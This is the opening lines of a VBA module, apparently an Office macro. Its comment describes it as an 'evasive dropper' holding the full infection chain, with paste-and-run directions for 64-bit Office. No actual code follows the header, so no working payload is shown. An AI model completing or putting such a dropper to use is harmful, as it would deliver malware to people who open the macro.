Attribute VB_Name = "RunCtx_Standalone"
Option Explicit

' Evasive dropper: the full chain in one module. Paste into a standard module,
' set the config constants below, and go. 64-bit Office.
'
